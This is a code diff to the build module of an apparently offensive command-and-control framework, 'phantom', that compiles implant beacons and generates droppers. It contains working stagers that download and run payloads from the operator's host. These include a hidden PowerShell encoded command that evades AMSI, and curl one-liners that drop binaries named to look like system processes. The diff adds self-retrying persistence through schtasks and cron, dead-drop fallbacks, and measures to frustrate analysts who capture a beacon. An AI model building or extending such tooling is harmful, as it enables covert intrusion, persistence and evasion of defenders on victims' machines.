@@ -11,7 +11,7 @@ from rich.console import Console
 from phantom.utils.notifier import notifier
 from phantom.utils.build_helper import check_build_env
 from phantom.utils.c2_crypto import write_beacon_crypto_config, write_beacon_c2_config, crypto_fingerprint
-from phantom.utils.network import beacon_pin
+from phantom.utils.network import beacon_pin, beacon_pubkey_pin
 from phantom.utils.beacon_auth import write_beacon_auth_config
 from phantom.utils.malleable import write_malleable_config
 
@@ -189,6 +189,23 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
                 proxy = get_c2_proxy()
         except Exception:
             hosts = hosts or []
+    # PER-ENDPOINT PINS: each rung of the ladder may present its own
+    # certificate, so `c2.pins` / `c2.pubkey_pins` carry one pin per rung
+    # (positionally aligned with [primary] + fallbacks); empty = [].
+    try:
+        from phantom.utils.network import get_c2_host_pins, get_c2_pubkey_pins
+        host_pins = get_c2_host_pins()
+        pubkey_pins = get_c2_pubkey_pins()
+    except Exception:
+        host_pins, pubkey_pins = [], []
+    # LAST-RING dead drop: the URL the beacon falls back to only when every
+    # ladder rung failed. Read from config here so a build always embeds the
+    # operator's current dead drop (no separate flag to forget).
+    try:
+        from phantom.utils.dead_drop import configured_url
+        dead_drop = configured_url()
+    except Exception:
+        dead_drop = ""
     if not check_build_env(platform, arch):
         notifier.error(f"Build environment not ready for {platform} ({arch}).")
         return None
@@ -229,22 +246,72 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
     # Enroll a unique identity for every explicit build. The private secret
     # is written only to the generated header and the operator registry.
     write_beacon_auth_config(beacon_dir)
-    write_beacon_crypto_config(beacon_dir)
+    # payload_token="": the identity enrolled just above derives its own
+    # download token at runtime. Burning the deployment token into every
+    # binary handed an analyst who captures one beacon the key to fetch every
+    # payload, forever.
+    write_beacon_crypto_config(beacon_dir, payload_token="")
     # No-disk persistence: embed the compact PowerShell stager so the
     # beacon's `persist` command writes a RunKey that relaunches the
     # in-memory path at logon (field-verified: the on-disk PE gets
     # execution-blocked by McAfee even when the file itself survives).
     ps_stager_b64 = ""
     try:
+        # ONE-SHOT on purpose: this blob is re-run by the beacon's own
+        # `persist` (RunKey at logon). Wrapping it resilient would schedule a
+        # SECOND persistence (a schtasks task) on top of the RunKey.
         _drop = generate_dropper(
-            "windows", host, str(port), dl_port=port, use_ssl=use_ssl)
+            "windows", host, str(port), dl_port=port, use_ssl=use_ssl,
+            resilient=False)
         if _drop and " -Enc " in _drop:
             ps_stager_b64 = _drop.rsplit(" -Enc ", 1)[1].strip()
     except Exception:
         ps_stager_b64 = ""
+    # REDIRECTOR-FIRST GUARDRAIL: a beacon that carries the operator's own
+    # listener address hands an analyst who captures it the backend to
+    # attack. Warn at BUILD time (doctor reports the same posture) unless a
+    # disposable `c2.front` covers the build.
+    try:
+        from phantom.utils.network import front_guard_reason
+        _front_reason = front_guard_reason(host)
+        if _front_reason:
+            notifier.warn(f"C2 front: {_front_reason}.")
+    except Exception:
+        pass
+    # Dead-drop-first: resolve the live endpoint before the first check-in so
+    # the indirection can be rotated without rebuilding (flag in the header).
+    try:
+        from phantom.utils import config as _cfg
+        bootstrap_dd = _cfg.get_bool("c2.bootstrap_dead_drop", True,
+                                     env="PHANTOM_C2_DEADDROP_BOOTSTRAP")
+    except Exception:
+        bootstrap_dd = True
+    # PIN SOURCE: a TLS-TERMINATING front presents its OWN certificate, so the
+    # pin must be derived from that file (c2.front_cert / certs/front.crt), not
+    # the backend's — otherwise every check-in fails once the two differ.
+    try:
+        from phantom.utils.network import c2_pin_cert_path
+        pin_cert = c2_pin_cert_path()
+    except Exception:
+        pin_cert = ""
+    if use_ssl:
+        try:
+            from phantom.utils.network import c2_pin_cert_path, get_c2_front
+            if get_c2_front() and not c2_pin_cert_path():
+                notifier.warn(
+                    "C2 front: a front is set but no front certificate was "
+                    "found — the beacon will pin the BACKEND certificate, "
+                    "which a TLS-terminating front does not present. Set "
+                    "c2.front_cert or drop certs/front.crt.")
+        except Exception:
+            pass
     write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl,
                            ps_stager_b64=ps_stager_b64, hosts=list(hosts or []),
-                           proxy=proxy or "", pin=beacon_pin())
+                           proxy=proxy or "", pin=beacon_pin(pin_cert),
+                           pins=host_pins, pubkey_pin=beacon_pubkey_pin(pin_cert),
+                           pubkey_pins=pubkey_pins,
+                           dead_drop=dead_drop or "",
+                           bootstrap_dead_drop=bootstrap_dd)
     write_malleable_config(beacon_dir, profile_path=malleable_profile)
     # Fresh XOR keystream per build so the C2 config never recurs in strings.
     _write_config_seed(beacon_dir)
@@ -621,22 +688,53 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
             return None
 
     elif platform == "macos":
-        console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
         osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
         o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
-        if not os.path.exists(o32_cc):
-            notifier.error(f"osxcross compiler not found at {o32_cc}")
-            return None
+        # On a REAL Mac osxcross does not exist and is not needed: the system
+        # clang++ builds the payload directly. Without this branch a macOS
+        # operator could not produce a macOS beacon at all — which made the
+        # cross-platform promise land on Linux/Windows in practice.
+        native = sys.platform == "darwin" and not os.path.exists(o32_cc)
+        if native:
+            console.print("[yellow][*] Compiling beacon for macOS (native clang++)...[/yellow]")
+        else:
+            console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
+            if not os.path.exists(o32_cc):
+                notifier.error(f"osxcross compiler not found at {o32_cc} "
+                               f"(on macOS the system clang++ is used "
+                               f"instead)")
+                return None
         try:
-            sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
             include_flags = ["-Isrc"]
-            if os.path.exists(sdk_path):
-                include_flags.append(f"-isysroot{sdk_path}")
+            link_flags = ["-lcurl", "-lssl", "-lcrypto", "-lpthread"]
+            compiler = o32_cc
+            if native:
+                compiler = os.environ.get("CXX") or "clang++"
+                # Homebrew's OpenSSL is keg-only: without these the compile
+                # stops at a missing <openssl/evp.h>.
+                openssl_prefix = os.environ.get("OPENSSL_PREFIX", "").strip()
+                if not openssl_prefix:
+                    try:
+                        openssl_prefix = subprocess.run(
+                            ["brew", "--prefix", "openssl@3"],
+                            capture_output=True, text=True, timeout=30,
+                        ).stdout.strip()
+                    except Exception:
+                        openssl_prefix = ""
+                if openssl_prefix and os.path.isdir(openssl_prefix):
+                    include_flags.append(f"-I{openssl_prefix}/include")
+                    link_flags.insert(0, f"-L{openssl_prefix}/lib")
+                else:
+                    notifier.warn("OpenSSL prefix not found; set "
+                                  "OPENSSL_PREFIX if the build fails.")
+            else:
+                sdk_path = os.path.join(osxcross_root, "SDK", "MacOSX.sdk")
+                if os.path.exists(sdk_path):
+                    include_flags.append(f"-isysroot{sdk_path}")
 
             subprocess.run(
-                [o32_cc, "-std=c++20", "-O2", "-o", "beacon_macos",
-                 *include_flags, "src/main.cpp",
-                 "-lcurl", "-lssl", "-lcrypto", "-lpthread"],
+                [compiler, "-std=c++20", "-O2", "-o", "beacon_macos",
+                 *include_flags, "src/main.cpp", *link_flags],
                 cwd=beacon_dir, check=True, capture_output=True, text=True, timeout=600)
             _mark_built(beacon_dir, out_name)
             return beacon_out
@@ -715,7 +813,63 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
 
 
 
-def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False) -> str:
+# ── resilient stager (8.1, option C) ───────────────────────────────────────
+#
+# One download attempt is a single point of failure: a captive portal, a
+# proxy hiccup or a filtered first hop and the engagement has no beacon and
+# no second chance (the operator has to re-deliver by hand). The resilient
+# stager keeps the SAME one-shot behaviour as the first move, and on
+# failure it schedules its own retry — with the C2 endpoint already inside
+# the retry, so the second attempt does not depend on the operator or on
+# the delivery channel still being open.
+#
+# The retry is PERSISTENCE: it leaves an artefact the operator must clean
+# up, so the task name and the retry script path are deterministic (see
+# `_RETRY_TASK_WIN`, `_RETRY_SCRIPT`) and the cleanup section can find them.
+_RETRY_TASK_WIN = "PhantomUpdate"
+_RETRY_SCRIPT = "~/.cache/.p/r"
+_RETRY_CACHE = "~/.cache/.p"
+_RETRY_MINUTES = 5
+
+
+def _ps_resilient(core_ps: str) -> str:
+    """Wrap the Windows PIC stager so a failed run schedules its retry."""
+    action = ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
+              + base64.b64encode(core_ps.encode("utf-16-le")).decode())
+    return (
+        "$e=$null;try{" + core_ps + "}catch{$e=$_};"
+        "if($e){schtasks /create /f /tn '" + _RETRY_TASK_WIN + "' /sc minute "
+        "/mo " + str(_RETRY_MINUTES) + " /tr \"" + action + "\"|Out-Null}"
+    )
+
+
+def _sh_resilient(command: str) -> str:
+    """Wrap a POSIX stager: run it now, and on failure schedule a retry.
+
+    The whole thing travels as base64 through the shell (`echo … | base64
+    -d | sh`), so the payload's own quoting (URLs in single quotes, spaces)
+    cannot break the wrapper, and the retry script carries the endpoint.
+    """
+    script = "\n".join((
+        f"mkdir -p {_RETRY_CACHE} 2>/dev/null",
+        # `printf %s` with no escape sequences: the base64 alphabet is
+        # shell-safe, and a format string here would be interpreted by the
+        # shell (a stray `\n` would be written INTO the retry script)
+        "printf %s " + base64.b64encode(command.encode()).decode()
+        + " | base64 -d > " + _RETRY_SCRIPT,
+        f"chmod +x {_RETRY_SCRIPT} 2>/dev/null",
+        f"if sh {_RETRY_SCRIPT}; then crontab -l 2>/dev/null | grep -v "
+        f"'{_RETRY_SCRIPT}' | crontab - 2>/dev/null; exit 0; fi",
+        f"(crontab -l 2>/dev/null | grep -v '{_RETRY_SCRIPT}'; "
+        f"echo '*/{_RETRY_MINUTES} * * * * sh {_RETRY_SCRIPT} "
+        ">/dev/null 2>&1') | crontab - 2>/dev/null",
+    )) + "\n"
+    return ("echo "
+            + base64.b64encode(script.encode()).decode()
+            + " | base64 -d | sh")
+
+
+def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", dl_port: int = None, use_ssl: bool = False, resilient: bool = True) -> str:
     """Generates an ultra-compact PowerShell PIC stager.
     
     Downloads XOR-encrypted beacon.bin → XOR-decrypts with 0xAA → 
@@ -726,12 +880,22 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
     AMSI-blind: 'Virtual'+'Alloc' and 'kernel'+'32' are split across
     concatenations so the full trigger never appears in the script text.
     
+    RESILIENT BY DEFAULT: a single download attempt is a single point of
+    failure, and a delivery channel that may not have the C2 up yet (a
+    physical drop, a staged exfil) must not lose the payload to one failed
+    fetch. The stager runs once and, on failure, schedules its own retry
+    WITH the endpoint embedded. Callers that must NOT leave persistence
+    (the no-disk stealth dropper, the beacon's own `persist` embed) pass
+    ``resilient=False`` explicitly.
+
     Args:
         lhost: C2/staging server host
         lport: Port for both C2 check-in AND staging payload download
         dl_port: Optional separate port for payload download (defaults to lport)
         arch: Architecture (x64/x86 — not used for PIC path)
         use_ssl: Use HTTPS for payload download
+        resilient: schedule a persistent retry on a failed first download
+                   (default True; False is the explicit one-shot opt-out)
     """
     if dl_port is None:
         dl_port = lport
@@ -791,20 +955,29 @@ def generate_dropper(platform: str, lhost: str, lport: int, arch: str = "x64", d
 
         b64_ps = base64.b64encode(ps.encode('utf-16-le')).decode()
         console.print(f"[green][+] Compact PIC stager: {len(b64_ps)} chars base64[/green]")
+        if resilient:
+            # the retry task re-runs the SAME stager, so the endpoint is
+            # already inside it; the task name is deterministic for cleanup
+            wrapped = _ps_resilient(ps)
+            return ("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "
+                    + base64.b64encode(wrapped.encode('utf-16-le')).decode())
         return f"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64_ps}"
 
     elif platform == "linux":
         path = "payload_linux_x86" if arch == "x86" else "payload_linux"
         url = f"{proto}://{lhost}:{dl_port}/api/v1/{path}?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        cmd = f"curl -sk '{url}' -o /tmp/.systemd-proc && chmod +x /tmp/.systemd-proc && nohup /tmp/.systemd-proc {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        return _sh_resilient(cmd) if resilient else cmd
 
     elif platform == "macos":
         url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_macos?{token_param}"
-        return f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        cmd = f"curl -sk '{url}' -o /tmp/.launchd-service && chmod +x /tmp/.launchd-service && nohup /tmp/.launchd-service {lhost} {lport} {1 if use_ssl else 0} &>/dev/null &"
+        return _sh_resilient(cmd) if resilient else cmd
 
     elif platform == "android":
         beac_url = f"{proto}://{lhost}:{dl_port}/api/v1/payload_android?{token_param}"
-        return f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
+        cmd = f"curl -sk '{beac_url}' -o $TMPDIR/.x && chmod +x $TMPDIR/.x && $TMPDIR/.x {lhost} {lport} {1 if use_ssl else 0}"
+        return _sh_resilient(cmd) if resilient else cmd
 
     return ""
 
@@ -830,8 +1003,11 @@ def generate_stealth_dropper(platform: str, lhost: str, lport: int,
 
     if platform == "windows":
         # in-memory PIC: nothing to delete on the beacon side
+        # ONE-SHOT on purpose: the stealth dropper's contract is "no artefact
+        # left on disk", so it must NOT schedule a retry (persistence).
         return generate_dropper(platform, lhost, lport, arch="x64",
-                                dl_port=dl_port, use_ssl=use_ssl)
+                                dl_port=dl_port, use_ssl=use_ssl,
+                                resilient=False)
 
     if platform in ("linux", "macos"):
         path = "payload_linux" if platform == "linux" else "payload_macos"
@@ -910,7 +1086,7 @@ def compile_remote(platform: str, pkg_root: str, force_rebuild: bool = False,
 
     # Identity + crypto + C2 config for THIS build (fresh per build).
     _remote_identity(remote_dir)
-    write_beacon_crypto_config(remote_dir)
+    write_beacon_crypto_config(remote_dir, payload_token="")
     write_beacon_c2_config(remote_dir, host=host, port=port, use_ssl=use_ssl)
 
     main_cpp = os.path.join(src_dir, "main.cpp")
